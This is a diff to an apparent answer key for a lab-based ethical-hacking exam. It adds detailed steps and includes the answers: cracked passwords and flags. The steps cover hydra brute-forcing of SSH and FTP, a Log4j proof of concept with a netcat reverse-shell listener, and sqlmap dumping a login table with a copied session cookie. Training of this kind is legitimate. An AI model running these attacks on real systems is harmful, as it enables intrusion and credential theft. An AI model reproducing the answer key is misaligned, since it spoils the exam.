@@ -29,7 +29,7 @@ The non-server IP represents the attacker; the other IP is the victim.
 **Explanation:**  
 
 In Wireshark, apply:
-`http && ip.addr == <victim IP>`
+`http && ip.addr == <victim IP>` (here victim IP is same as in #1 above)
 
 Or filter POST requests:
 `http.request.method == POST`
@@ -57,19 +57,20 @@ Or open the file with a text editor and review failed authentication attempts.
 
 **Explanation:**  
 
-Use Netcat or Telnet:
+Netcat:
 `nc -vv www.moviescope.com 80`  
-`GET / HTTP/1.0`
+`GET / HTTP/1.0 -> Enter x2`
 
-Or:
+Or Telnet:
 `telnet www.moviescope.com 80`
+`GET / HTTP/1.0 -> Enter x2`
 
-Alternatively, use NSE:
+Or NSE:
 `nmap -sV --script=http-enum <target website>`
 
 ---
 
-**Q5. Crack SSH credentials for user Martin and retrieve the password stored in $ollers.txt. (Format: aNaa**NNNNNAA*)**
+**Q5. Crack SSH credentials for user Martin on the 192.168.10.0/24 subnet and retrieve the password stored in $ollers.txt. (Format: aNaa**NNNNNAA*)**
 
 **Answer:** i2tr&^72546HJ*
 
@@ -85,11 +86,12 @@ Connect via SSH:
 `sshpass -p qwerty1234 ssh Martin@192.168.10.101`
 
 Navigate to Desktop and read the file:
+`cd Desktop -> dir`
 `type $ollers.txt`
 
 ---
 
-**Q6. Crack FTP credentials of user nick and determine the domain ID stored in w_domain.txt. (Format: NNNNNNNNNN)**
+**Q6. Crack FTP credentials of user nick on the 192.168.10.0/24 subnet and determine the domain ID stored in w_domain.txt. (Format: NNNNNNNNNN)**
 
 **Answer:** 7867721010
 
@@ -102,8 +104,8 @@ Brute-force FTP credentials:
 `hydra -L nick -P password.txt 192.168.10.111 ftp`
 
 Log in and retrieve the file:
-`ftp nick@192.168.10.111`  
-`get w_domain.txt`
+`ftp nick@192.168.10.111` -> apple`
+`cd Desktop -> dir -> get w_domain.txt`
 
 Review the file and note the ID value.
 
@@ -120,6 +122,22 @@ Navigate to `192.168.0.222:8080`.
 
 Follow Mod13 Task2 steps to exploit the Log4j vulnerability, obtain a reverse shell, and execute:
 `cat RootFlag.txt`
+- In home execute sudo apt-get update
+- tar -xf jdk-8u202-linux-x64.tar.gz
+- mv jdk1.8.0_202 /usr/bin
+- cd log4j-shell-poc
+- pluma poc.py
+- Update the JDK Path in the Poc.py file
+- Change Line no: 62, replace jdk1.8.0_20/bin/javac with "/usr/bin/jdk1.8.0_202/bin/javac"
+- Change Line no: 87, replace jdk1.8.0_20/bin/java with "/usr/bin/jdk1.8.0_202/bin/java"
+- Change Line no: 99, replace jdk1.8.0_20/bin/java with "/usr/bin/jdk1.8.0_202/bin/java"
+- execute this in seperate terminal [nc -lvp 9001]
+- python3 poc.py --userip {ip of attacker pc} --webport 8080 --lport 9001
+- Copy the [send this : value to be copied] from the output of previous command
+- paste in username box and type any password in password box, click login
+- Reverse shell connected in separate terminal where nc is listening
+- type cat RootFlag.txt to view answer
+- (If not connect to reverse shell reload the website and check the path and try again )
 
 ---
 
@@ -129,7 +147,7 @@ Follow Mod13 Task2 steps to exploit the Log4j vulnerability, obtain a reverse sh
 
 **Explanation:**  
 
-Connect to the target via SSH using credentials obtained earlier.  
+Connect to the target via SSH using credentials obtained in step 5.  
 Navigate to the appropriate directory and analyze the website using:
 `whatweb www.moviescope.com`
 
@@ -141,8 +159,11 @@ Navigate to the appropriate directory and analyze the website using:
 
 **Explanation:**  
 
-Run Wapiti:
+Install/Run Wapiti:
+`pip install wapiti3`
 `wapiti -u https://<targetwebsite>`
+`cd to generated report path (listed in output)`
+Open with firefox
 
 Open the generated report and analyze CVE details to identify the earliest affected vulnerability.
 
@@ -164,7 +185,7 @@ Run Wapiti against the target website and review the HTML report to identify mis
 
 **Explanation:**  
 
-FTP is open on the Windows Server:
+FTP is open on the Windows Server (.144):
 `hydra -L username.txt -P password.txt 192.168.10.144 ftp`
 
 Credentials: Parker / Passw0rd@1234  
@@ -190,6 +211,8 @@ Use WPScan:
 **Explanation:**  
 
 Run Wapiti against the target website.  
+`pip install wapiti3`
+`wapiti -u https://<targetwebsite>`
 Open the generated HTML report and count the listed risk categories.
 
 ---
@@ -201,9 +224,13 @@ Open the generated HTML report and count the listed risk categories.
 **Explanation:**  
 
 Log in using credentials from Question 2.  
-Capture the session cookie and use SQLMap:
-`sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<cookie>" --dbs`  
-`sqlmap -D moviescope -T User_Login --dump`
+Click profile -> Note URL for later
+Right click web page -> Inspect -> Console tab -> Copy users cookie (entire string)
+SQLMap:
+`sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<cookie value>" --dbs`
+`sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<cookie value>" -D moviescope --tables`
+`sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<cookie value>" -D moviescope -T User_Login --dump`
+See users
 
 ---
 
@@ -214,4 +241,5 @@ Capture the session cookie and use SQLMap:
 **Explanation:**  
 
 Use ZAP 2.4 to scan the target website and identify the WASC classification for SQL Injection.
+Or Google search
 
